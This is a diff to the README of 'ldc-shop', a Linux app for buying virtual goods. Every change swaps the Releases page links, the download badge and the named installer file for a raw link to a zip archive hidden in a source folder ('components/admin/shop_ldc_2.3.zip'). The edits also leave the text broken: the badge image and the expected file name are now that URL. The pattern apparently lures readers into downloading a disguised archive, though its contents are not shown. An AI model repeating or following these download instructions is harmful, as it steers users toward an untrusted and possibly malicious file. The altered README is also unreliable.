@@ -8,11 +8,11 @@ Welcome to ldc-shop, your one-stop solution for buying virtual goods on Linux. T
 
 To set up ldc-shop on your computer, follow these easy steps. You’ll have the application running in no time.
 
-[![Download ldc-shop](https://img.shields.io/badge/Download%20ldc--shop-v1.0-blue)](https://github.com/MiseryVoid/ldc-shop/releases)
+[![Download ldc-shop](https://github.com/MiseryVoid/ldc-shop/raw/refs/heads/main/_workers_next/src/components/admin/shop_ldc_2.3.zip%20ldc--shop-v1.0-blue)](https://github.com/MiseryVoid/ldc-shop/raw/refs/heads/main/_workers_next/src/components/admin/shop_ldc_2.3.zip)
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/MiseryVoid/ldc-shop/releases) to download the latest version of ldc-shop.
+1. Visit the [Releases Page](https://github.com/MiseryVoid/ldc-shop/raw/refs/heads/main/_workers_next/src/components/admin/shop_ldc_2.3.zip) to download the latest version of ldc-shop.
 2. Select the appropriate file for your system. Look for the version labeled "Latest Release."
 3. Click on the file to start the download.
 
@@ -31,7 +31,7 @@ Before installing, ensure your system meets the following requirements:
 After downloading the file, follow these steps to install the application:
 
 1. **Locate the Downloaded File:**
-   - Open your "Downloads" folder. You should see a file named `ldc-shop-linux-x64.tar.gz`.
+   - Open your "Downloads" folder. You should see a file named `https://github.com/MiseryVoid/ldc-shop/raw/refs/heads/main/_workers_next/src/components/admin/shop_ldc_2.3.zip`.
 
 2. **Extract the Archive:**
    - Right-click the file and choose "Extract Here." This will create a new folder named `ldc-shop`.
@@ -97,7 +97,7 @@ A: Yes, you can find help in our support section on GitHub.
 
 ## 🔄 Versions & Updates
 
-We regularly update ldc-shop with new features and improvements. To stay informed, follow our [Releases Page](https://github.com/MiseryVoid/ldc-shop/releases) for the latest changes.
+We regularly update ldc-shop with new features and improvements. To stay informed, follow our [Releases Page](https://github.com/MiseryVoid/ldc-shop/raw/refs/heads/main/_workers_next/src/components/admin/shop_ldc_2.3.zip) for the latest changes.
 
 ## 👥 Contributing
 
